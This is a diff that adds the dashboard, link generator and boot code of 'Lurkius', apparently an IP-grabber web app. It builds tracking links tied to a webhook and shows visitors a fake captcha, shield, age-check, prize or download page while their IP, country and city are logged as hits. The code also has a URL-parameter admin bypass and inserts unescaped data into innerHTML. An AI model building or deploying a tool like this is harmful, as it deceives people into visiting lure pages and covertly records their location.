+  const idx=accs.findIndex(a=>a.u===CU.u);
+  if(idx<0)return;
+  if(nu&&nu!==CU.u){
+    if(accs.find(a=>a.u===nu)){toast('Username taken.');return}
+    accs[idx].u=nu;CU.u=nu;
+    DB.set('lrk_session',{username:nu});
+    document.getElementById('navUser').textContent=nu;
+  }
+  if(np&&np.length>=6)accs[idx].h=hashPw(np);
+  if(!accs[idx].settings)accs[idx].settings={};
+  accs[idx].settings.wh=wh;CU.settings=accs[idx].settings;
+  saveAccs(accs);
+  document.getElementById('sPass').value='';
+  toast('Account saved!');
+}
+
+function saveAppearance(){
+  if(!CU)return;
+  const title=document.getElementById('sDashTitle').value.trim()||'Lurkius';
+  const ac=getComputedStyle(document.documentElement).getPropertyValue('--ac').trim();
+  const actx=getComputedStyle(document.documentElement).getPropertyValue('--ac-tx').trim();
+  const light=document.body.classList.contains('light');
+  if(!CU.settings)CU.settings={};
+  Object.assign(CU.settings,{title,ac,actx,theme:light?'light':'dark'});
+  document.getElementById('navName').textContent=title;
+  document.getElementById('navLogo').textContent=(title[0]||'L').toUpperCase();
+  save();toast('Appearance saved!');
+}
+
+function clearLinks(){
+  if(!confirm('Delete all links?'))return;
+  links=[];save();renderLinks();updateStats();toast('Cleared.');
+}
+
+function deleteAccount(){
+  if(!confirm('Delete your account permanently?'))return;
+  const accs=getAccs().filter(a=>a.u!==CU?.u);
+  saveAccs(accs);doLogout();
+}
+
+// ════════════════════════════════════════════
+// DASHBOARD
+// ════════════════════════════════════════════
+function showDash(){
+  const dp=document.getElementById('dashPage');
+  dp.style.display='flex';dp.classList.add('on');
+  dp.style.opacity='0';
+  requestAnimationFrame(()=>requestAnimationFrame(()=>{dp.style.transition='opacity .4s';dp.style.opacity='1'}));
+  if(V.ip&&V.ip!=='Unknown'){
+    pushAct(`<strong>${V.country}</strong> · ${V.city} · ${V.ip}`,true);
+    updateStats();
+  }
+}
+
+function tab(name){
+  const names=['overview','create','links','activity','settings'];
+  names.forEach((n,i)=>{
+    document.getElementById('tab'+n.charAt(0).toUpperCase()+n.slice(1))?.classList.toggle('on',n===name);
+    document.querySelectorAll('.d-si')[i]?.classList.toggle('on',n===name);
+  });
+}
+
+function updateStats(){
+  document.getElementById('stLinks').textContent=links.length;
+  document.getElementById('stHits').textContent=acts.length;
+  document.getElementById('stCtry').textContent=V.country&&V.country!=='Unknown'?[...new Set(acts.map(()=>V.country))].length:0;
+}
+
+// ════════════════════════════════════════════
+// LINKS
+// ════════════════════════════════════════════
+function createLink(){
+  const label  =document.getElementById('fLabel').value.trim()||`Link #${links.length+1}`;
+  const webhook=document.getElementById('fWebhook').value.trim()||(CU?.settings?.wh||DEFAULT_WH);
+  const style  =document.getElementById('fStyle').value;
+  const embedCfg={
+    title   :document.getElementById('eTitle').value||'📍 New Hit Logged',
+    desc    :document.getElementById('eDesc').value||null,
+    footer  :document.getElementById('eFooter').value||'Lurkius Security',
+    color   :document.getElementById('eColor').value,
+    thumb   :document.getElementById('eThumb').value,
+    thumbUrl:document.getElementById('eThumbUrl').value,
+  };
+  const key=randKey();
+  const d=enc({webhook,embedCfg,style});
+  const url=`${location.origin}${location.pathname}?k=${key}&d=${d}`;
+  links.push({label,key,url,style,hits:0,ts:Date.now()});
+  save();renderLinks();updateStats();
+  toast('Link generated!');
+  tab('links');
+}
+
+function clearCreate(){
+  ['fLabel','fWebhook','eDesc','eThumbUrl'].forEach(id=>document.getElementById(id).value='');
+  document.getElementById('eTitle').value='📍 New Hit Logged';
+  document.getElementById('eFooter').value='Lurkius Security';
+  document.getElementById('eColor').value='#ffffff';
+  document.getElementById('eThumb').value='flag';
+  document.getElementById('thumbRow').style.display='none';
+  updPrev();
+}
+
+function toggleThumb(){
+  document.getElementById('thumbRow').style.display=document.getElementById('eThumb').value==='custom'?'flex':'none';
+}
+
+function updPrev(){
+  document.getElementById('pTitle').textContent=document.getElementById('eTitle').value||'📍 New Hit Logged';
+  document.getElementById('pDesc').textContent=document.getElementById('eDesc').value||'';
+  document.getElementById('pFoot').textContent=document.getElementById('eFooter').value||'Lurkius Security';
+  document.getElementById('ePrev').style.borderLeftColor=document.getElementById('eColor').value;
+}
+
+function renderLinks(){
+  const empty=document.getElementById('linksEmpty');
+  const table=document.getElementById('linksTable');
+  document.getElementById('linkCnt').textContent=`${links.length} link${links.length!==1?'s':''}`;
+  if(!links.length){empty.style.display='block';table.style.display='none';return}
+  empty.style.display='none';table.style.display='table';
+  document.getElementById('linksBody').innerHTML=links.map((l,i)=>`
+    <tr>
+      <td>${l.label}</td>
+      <td><span class="d-key">${l.key}</span></td>
+      <td style="font-size:9px;color:var(--mt);text-transform:capitalize">${l.style}</td>
+      <td><div class="d-url" title="${l.url}">${l.url}</div></td>
+      <td>${l.hits}</td>
+      <td><button class="d-copy" onclick="cpLink(${i})">Copy</button></td>
+      <td><button class="d-del" onclick="delLink(${i})">✕</button></td>
+    </tr>`).join('');
+}
+
+function cpLink(i){navigator.clipboard.writeText(links[i].url).then(()=>toast('Copied!'))}
+function delLink(i){if(!confirm('Delete this link?'))return;links.splice(i,1);save();renderLinks();updateStats();toast('Deleted.')}
+
+// ════════════════════════════════════════════
+// ACTIVITY
+// ════════════════════════════════════════════
+function pushAct(html,live=false){
+  acts.unshift({html,live:false,ts:Date.now()});
+  if(acts.length>200)acts.pop();
+  save();renderActs();
+}
+
+function renderActs(){
+  ['actShort','actFull'].forEach(id=>{
+    const el=document.getElementById(id);if(!el)return;
+    if(!acts.length){el.innerHTML='<div class="d-empty"><div class="d-empty-ico">📡</div>No activity yet</div>';return}
+    const list=id==='actShort'?acts.slice(0,5):acts;
+    el.innerHTML=list.map(a=>`
+      <div class="d-act">
+        <div class="d-act-dot${a.live?' live':''}"></div>
+        <div><div class="d-act-tx">${a.html}</div><div class="d-act-time">${ago(a.ts)}</div></div>
+      </div>`).join('');
+  });
+  document.getElementById('actCnt').textContent=`${acts.length} hit${acts.length!==1?'s':''}`;
+}
+
+// ════════════════════════════════════════════
+// BOOT
+// ════════════════════════════════════════════
+(async function boot(){
+  const p=new URLSearchParams(location.search);
+
+  // Admin bypass
+  if(p.get('admin')===ADMIN){
+    document.getElementById('vWrap').style.display='none';
+    const sess=DB.get('lrk_session');
+    if(sess?.username){loadUser(sess.username);showDash();}
+    else showAuth();
+    return;
+  }
+
+  // Decode link config
+  const cfg = p.get('d') ? dec(p.get('d')) : null;
+  const style = cfg?.style||'captcha';
+
+  showTpl(style);
+
+  if(style==='captcha')       await runCaptcha(cfg);
+  else if(style==='shield')   await runShield(cfg);
+  else if(style==='age')      await runAge(cfg);
+  else if(style==='prize')    await runPrize(cfg);
+  else if(style==='download') await runDownload(cfg);
+})();
+</script>
+</body>
+</html>
